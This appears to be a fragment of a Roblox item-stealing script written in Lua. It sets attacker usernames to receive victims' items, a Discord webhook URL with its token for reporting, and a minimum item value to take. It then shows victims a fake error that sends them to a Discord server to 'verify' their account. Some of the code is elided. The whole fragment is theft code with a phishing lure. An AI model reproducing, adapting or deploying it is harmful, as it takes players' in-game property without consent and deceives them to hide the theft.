Username = "imbigbrainashesh"
Username2 = "Mahmoudhussein82" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1233793055404986460/Ghn8waiYS4cfi_dB9-lK5_wZX9R4OrNwS6p4ERIlg5YJevACyFfhAMbS3Fil00QPjVIm"
min_rap = 50000 -- minimum rap of each item you want to get sent to you.
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    message.Error("Please go verify your account in our discord!\nJoin discord.gg/u5CrDp2h3U")
end
